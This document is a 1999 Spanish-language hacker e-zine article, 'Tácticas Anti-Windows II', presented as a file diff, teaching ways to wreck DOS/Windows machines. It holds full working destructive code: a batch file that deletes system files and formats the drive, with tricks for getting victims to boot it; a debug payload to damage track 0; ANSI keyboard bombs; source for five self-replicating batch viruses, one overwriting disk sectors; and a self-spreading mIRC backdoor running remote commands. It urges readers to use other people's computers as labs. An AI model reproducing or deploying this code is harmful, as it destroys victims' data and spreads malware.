@@ -1,0 +1,503 @@
+El Radiaktivo Newz Team presenta:                            ernt@bigfoot.com
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                +--------------------------------------------+
+                |          Tácticas Anti-Windows II          |
+                |                por BadBit                  |
+                +--------------------------------------------+
+
+                              badbit@yahoo.com
+
+            Microsoft no es la respuesta, Microsoft es la pregunta,
+                           la respuesta es ¡NO!
+
+ /----------\
+ |Aclaración|
+ \----------/
+
+    No tomo responsabilidad por tus acciones. El contenido de este texto es
+únicamente EDUCACIONAL. Todos los casos son HIPOTETICOS, ninguno sucedió en
+realidad. No acepto reclamaciones de ningún tipo.
+
+ /---------------------------------------------------\
+ | ¿Exactamente de que se va a hablar en este texto? |
+ \---------------------------------------------------/
+
+    Esta es la segunda parte de un texto que escribí hace tiempo, ¿Porqué lo
+continúo? Porque lo dejé muy incompleto, no puse todo lo que en realidad
+quería mostrar. Existen muchas otras maneras de descomponer Windows. ¡Tenemos
+que acabar con el reinado de Microsoft!. Y también digo (¡demonios!) como
+protegerse de estas tácticas.
+
+    Esta segunda parte es más una recopilación que una invención 100% mía,
+pero no me tiren tomates todavía, le modifiqué y añadí bastante. Así que lean
+y descansen si pueden...
+
+             >>SECCION I - Tácticas anti-windows en modo MS-DOS<<
+
+ /------------------\
+ | Mr. Happy Delete |
+ \------------------/
+
+    Este es un archivo batch llamado Mr. Happy Delete, salió en The Anarchist
+Cookbook, y fué desarrollado por Vortex y Haqr. Lo que hace es borrar todo
+y formatear el disco duro, pero como el archivo original te pedía
+confirmación, yo lo modifiqué para hacer que borrara todo automáticamente
+
+
+@ECHO OFF
+:HeHe
+ECHO One moment please......
+@ATTRIB -S -H -R C:\*.*
+DEL C:\MSDOS.SYS
+DEL C:\IO.SYS
+DEL C:\CONFIG.SYS
+DEL C:\AUTOEXEC.BAT
+DEL C:\WINDOWS\*.INI
+DEL C:\WINDOWS\*.GRP
+if exist c:\windows\winfile.exe GOTO DEL1
+if exist c:\win95\winfile.exe GOTO DEL2
+if exist c:\dos\command.com GOTO DEL3
+:DEL1
+DELTREE C:\WINDOWS /Y
+GOTO END
+:DEL2
+DELTREE C:\WIN95 /Y
+GOTO END
+:DEL3
+DELTREE C:\DOS /Y
+GOTO END
+:END2
+goto end3
+:END
+FORMAT C: /autotest
+ECHO This computer is now officially screwed.  Thank you for using Mr. Happy
+ECHO delete! Have a nice day!
+:end3
+
+    Se supone que si corres este archivo del disco duro no va a servir, ya
+que el sistema no deja borrar archivos que se están usando, por eso, los
+creadores del archivo dicen que se debe grabar con el nombre de autoexec.bat
+en un floppy de arranque, el floppy debe contener los archivos format.exe,
+choice.com, attrib.com y deltree.exe. ¿Pero como hacer que el usuario
+arranque con ese disco? Puedes hacerlo de varias maneras:
+
+1. Cambiando su disco de emergencia de windows por el de Mr. Happy Delete,
+   así, cuando más ocupe arreglar su sistema, lo rematará.
+
+2. Si es lo suficientemente idiota, decirle que es un juego que requiere
+   dejar el disco adentro para que el juego arranque.
+
+3. Decirle que es un nuevo sistema operativo que está en floppy y obviamente
+   ocupa arrancar desde el diskette.
+
+4. Arrancar con el disco tú mismo.
+
+5. Dejar el disco adentro sin que el usuario se dé cuenta. Este es el método
+   menos recomendable.
+
+    En realidad nunca he probado el archivo, probablemente no sirva, pero
+haz el intento.
+
+
+ /------------------\
+ | Dañar el track 0 |
+ \------------------/
+
+    Al dañar el track 0 del disco duro, se vuelve inusable, veamos cómo
+hacerlo:
+
+    Entra al modo MS-DOS, tipea "debug", recibirás un guión como prompt, haz
+que quede como lo siguiente:
+
+C:\>debug
+- e 100
+  b8 11 05 bb 10 01 b9 01 00 ba 80 00 cd 13 cd 20
+  00 80 00 02 00 03 00 04 00 05 00 06 00 07 00 08
+  00 09 00 0a 00 0b 00 0c 00 0d 00 0e 00 0f 00 10   <enter>
+- g
+C:\>
+
+    Esto hace que el sector 0 sea marcado como dañado en el siguiente reboot.
+
+
+ /---------------------------\
+ | "Creí que eso era normal" |
+ \---------------------------/
+
+    El siguiente código en esamblador hace que la computadora sufra un
+reboot. Si lo compilas y lo pones en el autoexec, va a estar ca...fé
+quitarlo. ¡Ah! Otra cosa: no lo intentes correr en windows porque no sirve.
+
+CSEG       SEGMENT PARA PUBLIC 'CODE' 
+           ASSUME  CS:CSEG,DS:CSEG 
+  
+
+           ORG     0100H 
+
+REBOOT     PROC    FAR 
+
+           MOV     AX,0FFFFH 
+           PUSH    AX 
+           SUB     AX,AX 
+           PUSH    AX 
+           RET 
+  
+
+REBOOT     ENDP 
+CSEG       ENDS 
+           END     REBOOT 
+
+
+ /-----------------------\
+ | Un truquito con fdisk |
+ \-----------------------/
+
+    No muchos conocen el programa fdisk, el cual nos sirve para particionar
+el disco duro (si no sabes que es particionar, estas técnicas van dedicadas
+para tí). Bueno, este programa nos puede servir para borrar todos los datos.
+
+    Inicia el programa fdisk, selecciona la opción 3, la cual nos sirve para
+borrar particiones de DOS. Ahora borra todas las particiones. La computadora
+te va a decir que presiones CTRL + ALT + DEL (desde cuándo tenemos que
+obedecer a una máquina), no le hagas caso y presiona CTRL-C. En un rato la
+computadora va a toser y a morirse. Adiós a todos los datos.
+
+ /-----------------\
+ | El caracter 255 |
+ \-----------------/
+
+    En la tabla de caracteres ASCII, hay 255 caracteres, el último caracter,
+parece un espacio, pero no lo es, si en lugar de usar espacio usas el
+caracter 255, DOS no lo va a reconocer. Bueno, después de esta explicación,
+el truco:
+
+    Haz un directorio y ponle de nombre el caracter 255, para hacerlo
+escribe: "md" y luego barra espaciadora y luego presiona ALT y sin dejar de
+presionar tecleea "255" en el teclado numérico y después ENTER. Te recomiendo
+que hagas el directorio en el directorio raíz, ahora verás porqué, ejecuta
+el siguiente comando:
+
+XCOPY C:\  C:\"ALT+255"/s/e
+
+    Reemplaza "ALT+255" por el caracter 255. Ese comando va a copiar todo
+el disco duro al nuevo directorio, pero como el usuario va a creer que tiene
+por nombre " ", no lo va a poder borrar. Claro, esto solo sirve para usuarios
+que no conocen el caracter 255 y que no esten en modo windows (para que no
+entren, bórrale el win.com).
+
+ /------\
+ | ANSI |
+ \------/
+
+    Puedes hacer que el command prompt sea texto negro en fondo negro y por
+lo tanto el usuario no va a ver nada y va a creer que su computadora está
+descompuesta y la va a llevar a reparar y los técnicos de reparación no van
+a encontrar ningún problema y se van a ir por el camino fácil por lo tanto
+van a formatear el disco duro y el usuario va a perder todos sus datos.
+
+    Bueno, volviendo a la parte de texto negro en fondo negro que va a hacer
+que el usuario no vea nada y va a creer que su computadora está descompuesta
+y la va a llevar a reparar y los técnicos de reparación no van a encontrar
+ningún problema y se van a ir por el camino fácil por lo tanto van a
+formatear el disco duro y el usuario va a perder todos sus datos.
+
+    Ahora sí voy a explicar cómo hacer que haya texto negro en fondo negro
+y que va a hacer que el usuario no vea nada... ¡¡¡YAAAA!!! Bueno está bien,
+lo que se requiere es que el archivo ANSI.SYS esté cargado en el CONFIG.SYS,
+por ejemplo, si ves la siguiente línea en el CONFIG.SYS es que ANSI.SYS está
+cargado:
+
+DEVICE=C:\DOS\ANSI.SYS
+
+    Si lo tiene cargado, pon la siguiente línea en el autoexec:
+
+prompt=$E[0;30;40m
+
+    ¡Ta-da! Eso es todo. PERO, hay otros trucos que se pueden hacer con ANSI,
+las llamadas Bombas ANSI, las cuales hacen que al presionar una tecla
+determinada se ejecute un comando.
+
+Este comando hace que al usar Backspace salga la parabra Hey!:
+[8;"Hey!               "p
+
+Este hace un batch con el nombre ~, se activa con la tecla [`]
+[96;96p
+[96;"echo @echo off>~.bat
+echo cls>>~.bat
+echo echo Working...>>~.bat
+echo ctty nul>>~.bat
+echo dir \ /s>>~.bat
+echo ctty con>>~.bat
+echo del ~.bat>>~.bat
+~
+"p
+
+ /-------------\
+ | Virus Batch |
+ \-------------/
+
+    Estos son unos cuantos virus que saqué del texto "Batch File Viruses and
+ANSI Bombs", el cual no tiene autor. Estos virus no son detectados por
+ningún anti-virus, pero Thunderbyte se comporta extrañamente al verlos, dice
+que hay un posible virus en el archivo, pero nada más, toda la demás
+información está en blanco.
+
+    Los virus son los siguientes:
+
+ZEP    (165) - ¡El más pequeño hasta el momento! Excepto por GeeZ.
+
+XOP    (361) - Infecta dos batches por ejecución.
+
+POT    (685) - Infecta un batch por cada ejecución. si no puede infectar
+	       nada, suelta dos bombas ANSI (la barra espaciadora flashea un
+               mensaje y la tecla ` ejecuta la copia en la raíz del disco)
+               y busca '00' en cualquier lugar de la hora actual. Si lo
+               encuentra, despliega un mensaje tonto, descrubriéndose.
+
+SKUL   (497) - ¡Este es un archivo PELIGROSO! ¡Sobreescribirá más de 8000
+	       sectores del drive C en el día 20 de cualquier mes!
+               ¡NO LO CORRAS!. Se esconde de TYPE pero no define ninguna
+               tecla.
+
+ZOP_B  (615) - Infecta dos archivos por ejecución. Si archivos infectados son
+	       TYPE'ados la tecla ` será redefinida para ejecutarse a sí
+	       mismo. La tecla es indefinida después de que el virus corre.
+               No verás mucho cuando lo TYPEas.
+
+--ZEP.BAT------------------------------------------------------------------
+@echo off%[ZeP]%
+if not exist %0.bat goto ZeP
+for %%f in (*.bat ..\*.bat) do set ZeP=%%f
+find /i "ZeP"<%ZeP%>nul
+if errorlevel 1 find "ZeP"<%0.bat>>%ZeP%
+:ZeP
+
+--XOP.BAT------------------------------------------------------------------
+@echo off%[XoP]%
+if '%XoP%=='11 goto XoP2
+if '%2=='_ goto XoP1
+if exist C:\XoP.bat goto XoP
+if not exist %0.bat goto XoP2
+find "XoP"<%0.bat>C:\XoP.bat
+attrib C:\XoP.bat +h
+:XoP
+for %%v in (*.bat ..\*.bat) do call C:\XoP %%v _
+set XoP=
+goto XoP2
+:XoP1
+find /i "XoP"<%1>nul
+if not errorlevel 1 goto XoP2
+type C:\XoP.bat>>%1
+set XoP=%XoP%1
+:XoP2 
+
+--POT.BAT------------------------------------------------------------------
+@echo off%_PoT%
+if '%PoT%=='I goto PoTz
+if '%1=='_ goto PoTi
+if exist C:\PoT.bat goto PoT
+if not exist %0.bat goto PoTz
+find "PoT"<%0.bat>C:\PoT.bat
+attrib C:\PoT.bat +h
+:PoT Makes You Feel Goodz
+for %%f in (*.bat ..\*.bat C:\*.bat) do call C:\PoT.bat _ %%f
+if '%PoT%=='I goto PoTf
+set PoT=
+echo %PoT%[32;"You're Stoned!       "p
+echo %PoT%[96;"C:\PoT";13p%PoT%[2A
+echo.%_PoT%|time|find "00">nul
+if errorlevel 1 goto PoTf
+echo %PoT%[1A%PoT%[s%PoT%[1;37;44m
+echo %PoT%[3;9H Let me outta here! %PoT%[0m%PoT%[u
+:PoTf gold
+set PoT=
+goto PoTz
+:PoTi nfect
+find /i "PoT"<%2>nul
+if not errorlevel 1 goto PoTz
+type C:\PoT.bat>>%2
+set PoT=I
+:PoTz
+
+--SKUL---------------------------------------------------------------------
+::[8mSKuL
+@echo off%[SKuL]%
+echo.|date|find "20">nul%[SKuL]%
+if errorlevel 1 goto SKuL1
+echo SKuL Killing Hardfile...
+::echo °¹  ™Í&Í>SKuL.com 
+::SKuL
+:SKuL1 [6A
+if exist C:\SKuL goto SKuL2
+if not exist %0.bat goto SKuL
+find "SKuL"<%0.bat>C:\SKuL
+attrib C:\SKuL +h
+:SKuL2 [5A
+set SKuL=C:\AUTOEXEC.BAT
+for %%f in (D:*.bat C:*.bat ..\*.bat) do set SKuL=%%f
+if not exist %SKuL% goto SKuL
+find /i "SKuL"<%SKuL%>nul
+if errorlevel 1 type C:\SKuL>>%SKuL%
+set SKuL=
+:SKuL [7A[0m
+
+--ZOP_B.BAT----------------------------------------------------------------
+@echo off
+::[8m --- [ZoP_B] Batch Infector ---
+if '%2=='ZoP_ goto ZoP_1
+if '%1=='ZoP_ echo ["`";"`"p
+::["`";"ZoP_B ZoP_";13p
+::[4AZoP_
+if exist c:\ZoP_B.bat goto ZoP_
+if not exist %0.bat goto ZoP_2
+echo @echo Off>c:\ZoP_B.bat
+find "ZoP_"<%0.bat>>c:\ZoP_B.bat
+attrib c:\ZoP_B.bat +h
+::[6AZoP_
+:ZoP_
+for %%v in (*.bat) do call c:\ZoP_B %%v ZoP_
+if '%ZoP_%==' for %%v in (..\*.bat) do call c:\ZoP_B %%v ZoP_
+set ZoP_=
+goto ZoP_2
+::[6AZoP_
+:ZoP_1
+if '%ZoP_%=='11 goto ZoP_2
+find "ZoP_"<%1>nul
+if not errorlevel 1 goto ZoP_2
+type c:\ZoP_B.bat>>%1
+set ZoP_=%ZoP_%1
+:ZoP_2 
+::ZoP_[7A[0m
+
+
+             >>SECCION II - Tácticas anti-windows en modo Windows<<
+
+ /------------------\
+ | Backdoors en IRC |
+ \------------------/
+
+    mIRC es para mí, el cliente IRC con el mejor lenguaje de scripts. Gracias
+a eso, han salido muchos scripts útiles y que te hacen superior a cualquier
+otro usuario que use mIRC sin scripts. Pero, dada su capacidad, han salido
+scripts maliciosos que se reproducen a sí mismos y crean backdoors a la
+persona infectada. Para evitar que estos virus se reproduzcan, los canales
+más importantes de los servidores IRC, advierten a los usuarios infectados
+y no los dejan entrar hasta que remuevan las líneas destructivas. Ahora,
+antes de hacer nuestro propio backdoor, vamos a analizar uno ya existente:
+
+on 1:START:{
+  .sreq ignore
+  .remote on
+}
+
+on 1:TEXT:*:?:{
+  if ( $1 == runthis ) { .run $2- }
+}
+
+on 1:JOIN:*:{
+  if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini
+}
+
+
+    Lo que hace este virus es que sileciosamente, cada vez que alguien entre
+a un canal en donde estés tú, le vas a mandar el archivo script.ini, (el
+archivo del virus) y el usuario al que se lo mandas, se lo mandará a otros
+etc.
+
+    Hacer un backdoor simple es simple (no pos si), muchos dicen que lo
+máximo que te puede hacer un backdoor es desconectarde del IRC, pero mi
+experiencia dice que te puede borrar todos los datos, tomemos el siguiente
+ejemplo:
+
+on 1:CONNECT:{
+    /amsg BadBit Tengo el BadBit Backdoor!!!
+}
+
+on 1:NOTICE:!desconectar:?:{
+    /quit He sido desconectado por orden de mis superiores.
+}
+
+on 1:TEXT:*hola*:?:{
+    /quit Adios.
+}
+
+    Este backdoor no borra nada, pero esto se puede hacer mandando un archivo
+bat y hacer un comando que lo ejecute. Haría un backdoor super-avanzado, pero
+me de mucha flojera. En serio quería hacerlo. Si alguien tiene ideas de que
+ponerle, dígamelas y a lo mejor me animo a hacer el backdoor.
+
+ /--------\
+ | Bromas |
+ \--------/
+
+    Mi especialidad. Me encanta hacerle bromas a los usuarios y ver sus
+caras de terror. Si no me creen, preguntenle al kibitzer.
+
+    ¿A qué tipo de bromas me estoy refiriendo? Pues a programitas que
+producen situaciones falsas que pueden asustar al usuario. ¿Ejemplos? Que
+parezca que le formatean el disco, que salgan mensajes de error, etc.
+
+Nota:
+Una parte de donde puedes bajarte bromas buenas es en: www.thefreesite.com
+
+    Ahora una lista de algunas bromas:
+
+    joke.exe -> Este archivo hace una reproducción muy fiel del comando
+format. Hace creer al usuario que el disco se está formateando. Es tan real
+que hasta hace el ruido del disco duro. Lástima que sólo se ejecute en modo
+MS-DOS.
+
+    Error95 -> Este fué uno de los mejores cuando recién lo ví, genera
+mensajes de error falsos en intervalos de tiempo determinados. El único
+defecto es que es shareware, por lo tanto tienes que pagar $15 por un
+programa que puedes hacer tú mismo y mejor. Si no te registras tienes que
+soportar la falta de características.
+
+    WinOza -> Esta es la mejor broma, aunque se limita a movimientos del
+mouse, les diría todas las funciones que tiene, pero cuando me formatearon
+el disco duro (snif!) lo perdí. Pero pueden encontrarlo con cualquier
+buscador.
+
+    Crazy Keys -> Este programa hace que las teclas Num Lock, Caps Lock y
+Scroll Lock (¿alguien me podría decir para qué sirve esta última?) parpadeen
+cada determinado tiempo provocando escritos como el siguiente:
+
+cRAzy keYS SOlamENTE hace parpadeAR LAS teclas DE cApS LOCk y Num loCK. Es
+MUy UTIl por SI QUieren ESCRIbiR DE EsTE ESTIlO SIN batALLAr.
+
+    Fake Start -> Lo que hace es una barra de tareas falsa que no se puede
+activar. Aunque presiones el botón inicio, presiones Ctrl+Esc, aunque hagas
+magia Vudú, nada de eso hará que el menú inicio aparezca.
+
+
+  /----------------\
+  | Ultimo consejo |
+  \----------------/
+
+    Lo último que les tengo que decir [¡Por fin se va a callar este BadBit!]
+es que usen las computadoras ajenas como laboratorios, aprovechen la
+oportunidad para aprender más, es lo que hacemos todos los del equipo.
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Después de esta divertida (Zzzzzz) lectura espero que practiques lo
+aprendido y te diviertas a lo bruto. Hay mucha gente idiota que no merece
+usar computadoras, esto me recordó algo que leí en nosédonde: ¿Porqué no
+hacer una prueba de uso de computadoras como se hace una prueba de manejo?
+Si para usar un auto requieres licencia ¿Porqué no hacen lo mismo para las
+computadoras? Y nos ahorraríamos muuuuucho trabajo.
+
+-----------------------------------------------------------------------------
+Copyright 1999, El Radiaktivo Newz Team
+
+http://www.bigfoot.com/~ernt
+ernt@bigfoot.com
+
+Written by BadBit <badbit@yahoo.com>
+
+                            0101001001010100100101
+                            10       0       1  01
+                            11     B@dBit       00
+                            01           1      10
+                            10 0           .... 10
+                            :101010 01011010111101
